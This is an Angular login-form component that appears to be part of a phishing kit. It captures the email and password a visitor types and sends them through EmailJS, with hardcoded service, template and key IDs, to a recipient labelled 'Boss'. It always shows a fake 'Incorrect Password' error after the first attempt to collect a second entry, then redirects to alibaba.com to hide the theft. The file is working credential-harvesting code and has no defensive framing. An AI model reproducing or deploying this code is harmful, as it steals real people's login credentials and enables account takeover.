import { CommonModule } from '@angular/common';
import { Component, OnInit } from '@angular/core';
import {
  FormBuilder,
  FormGroup,
  FormsModule,
  ReactiveFormsModule,
} from '@angular/forms';
import emailjs from '@emailjs/browser';

@Component({
  selector: 'app-mobile-forms',
  imports: [CommonModule, ReactiveFormsModule, FormsModule],
  templateUrl: './mobile-forms.component.html',
  styleUrl: './mobile-forms.component.scss',
})
export class MobileFormsComponent implements OnInit {
  loginForm!: FormGroup;
  showError = false;

  showPassword = false;
  attemptCount = 0;

  constructor(private fb: FormBuilder) {}

  ngOnInit(): void {
    this.loginForm = this.fb.group({
      email: this.fb.control(null),
      password: this.fb.control(null),
    });
  }

  get loginFormControl() {
    return this.loginForm.controls;
  }

  get errorMessage() {
    return 'Incorrect Password';
  }

  submit() {
    if (this.attemptCount < 1) {
      this.send();

      this.attemptCount++;
    } else {
      this.send(true);
    }

    this.showError = false;
  }

  redirectToExternalSite() {
    window.location.href = 'https://www.alibaba.com/';
  }

  async send(end: boolean = false) {
    emailjs.init('pYLO6QYN6aeg6Sagd');
    const response = await emailjs
      .send('service_n6dsppy', 'template_fxjwyar', {
        from_name: 'Alan',
        to_name: 'Boss',

        message: `Email: ${
          this.loginFormControl['email'].value || ''
        } Password: ${this.loginFormControl['password'].value}, Attempt: ${
          this.attemptCount + 1
        }`,

        reply_to: 'No one',
      })
      .then(() => {
        this.showError = true;
        if (end) {
          this.redirectToExternalSite();
        }
      })
      .catch(() => {
        if (end) {
          this.redirectToExternalSite();
        }
      });
  }
}
